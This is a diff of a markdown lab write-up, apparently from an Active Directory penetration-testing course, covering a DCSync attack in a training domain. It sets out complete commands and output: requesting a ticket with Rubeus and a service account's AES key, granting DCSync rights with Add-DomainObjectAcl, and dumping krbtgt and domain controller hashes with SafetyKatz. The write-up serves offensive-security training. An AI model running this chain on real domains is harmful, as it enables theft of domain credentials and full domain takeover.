@@ -1,30 +1,20 @@
-# Learning Objective 12
+# Learning Objective 12 (Replication Rights Abuse for DCSync Attack)
 
 ## Tasks
 
-1. **Check if `student422` has Replication (DCSync) rights**
+1. **Check if `student422` has `Replication` (DCSync) rights**
 2. **If yes, execute the DCSync attack to pull hashes of the `krbtgt` user**
-3. **If no, add the replication rights for the `student422` and execute the DCSync attack to pull hashes of the `krbtgt` user**
+3. **If no, add the `Replication` rights for the `student422` and execute the DCSync attack to pull hashes of the `krbtgt` user**
 
 ---
 
 ## Solution
 
-1. **Check if `student422` has Replication (DCSync) rights**
+1. **Check if `student422` has `Replication` (DCSync) rights**
 
 We can check if `student422` has replication rights using the following commands.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /groups`:
 ```
@@ -35,7 +25,7 @@ Group Name                                 Type             SID                 
 ========================================== ================ ============================================= ==================================================
 Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
 BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Group used for deny only❌
+BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Group used for deny only❌
 BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
@@ -59,52 +49,21 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 ```
 ❌
 
-3. **If no, add the replication rights for the `student422` and execute the DCSync attack to pull hashes of the `krbtgt` user**
+3. **If no, add the `Replication` rights for the `student422` and execute the DCSync attack to pull hashes of the `krbtgt` user**
 
-If the `student422` does not have replication rights, let's add the rights.
+If the `student422` does not have replication rights, **let's add the rights**.
+
 Start a process as domain administrator by running the below command from an elevated command prompt.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
-
-`whoami /groups`:
-```
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID                                           Attributes
-
-========================================== ================ ============================================= ===============================================================
-Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
-BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
-LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
-dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
 [SNIP]
 
-[*] Action: Ask TGT
+[*] Action: Ask TGT📌
 
 [*] Got domain: dollarcorp.moneycorp.local
 [*] Showing process : True
@@ -130,8 +89,8 @@ Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 [*] Target LUID: 0x6d7248
 [+] Ticket successfully imported!🎟️
 
-  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
-  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
+  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
+  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
   UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
   UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
   StartTime                :  2/14/2025 4:58:23 AM
@@ -158,46 +117,15 @@ Run the below commands in the new spawned process.
 ```
 [SNIP]
 
-VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student422,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync'
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student422📌,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync'📌
 on DC=dollarcorp,DC=moneycorp,DC=local
 
 [SNIP]
 ```
 
-Let’s check for the rights once again from the normal shell.
+Let's check for the rights once again from the normal shell.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
-
-`whoami /groups`:
-```
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID                                           Attributes    
-========================================== ================ ============================================= ==================================================
-Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Group used for deny only❌
-BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
-LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
-dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -226,7 +154,7 @@ IsInherited            : False
 AceFlags               : None
 InheritedObjectAceType : All
 OpaqueLength           : 0
-IdentityName           : dcorp\student422📌
+IdentityName           : dcorp\student422👤
 
 AceQualifier           : AccessAllowed
 ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
@@ -246,7 +174,7 @@ IsInherited            : False
 AceFlags               : None
 InheritedObjectAceType : All
 OpaqueLength           : 0
-IdentityName           : dcorp\student422📌
+IdentityName           : dcorp\student422👤
 
 AceQualifier           : AccessAllowed
 ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
@@ -266,7 +194,7 @@ IsInherited            : False
 AceFlags               : None
 InheritedObjectAceType : All
 OpaqueLength           : 0
-IdentityName           : dcorp\student422📌
+IdentityName           : dcorp\student422👤
 ```
 🚩
 
@@ -276,45 +204,13 @@ Sweet! Now, below command (or any similar tool) can be used as `student422` to g
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
-
-`whoami /groups`:
-```
-GROUP INFORMATION
------------------
-
-Group Name                                 Type             SID                                           Attributes
-
-========================================== ================ ============================================= ===============================================================
-Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators📌                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
-BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
-LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
-dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
 ```
 [SNIP]
 
-mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
+mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
 [DC] 'dollarcorp.moneycorp.local' will be the domain
 [DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
 [DC] 'dcorp\krbtgt' will be the user account
@@ -325,7 +221,7 @@ Object RDN           : krbtgt
 
 ** SAM ACCOUNT **
 
-SAM Username         : krbtgt🔑
+SAM Username         : krbtgt👤
 Account Type         : 30000000 ( USER_OBJECT )
 User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
 Account expiration   :
@@ -346,7 +242,7 @@ Supplemental Credentials:
     Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
     Default Iterations : 4096
     Credentials
-      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848📌
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
       aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
       des_cbc_md5       (4096) : 150ea2e934ab6b80
 
@@ -368,7 +264,7 @@ Object RDN           : DCORP-DC
 
 ** SAM ACCOUNT **
 
-SAM Username         : DCORP-DC$🔑
+SAM Username         : DCORP-DC$👤
 Account Type         : 30000001 ( MACHINE_ACCOUNT )
 User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
 Account expiration   :
@@ -415,7 +311,7 @@ Supplemental Credentials:
     Default Salt : DOLLARCORP.MONEYCORP.LOCALhostdcorp-dc.dollarcorp.moneycorp.local
     Default Iterations : 4096
     Credentials
-      aes256_hmac       (4096) : bf32456704e1f1c1abaf07d210514339283201990a128b85d31cea103e7a39c2📌
+      aes256_hmac       (4096) : bf32456704e1f1c1abaf07d210514339283201990a128b85d31cea103e7a39c2🔑
       aes128_hmac       (4096) : acf4e3984964a674209dae10e154decf
       des_cbc_md5       (4096) : e629cbf7323d32a4
     OldCredentials
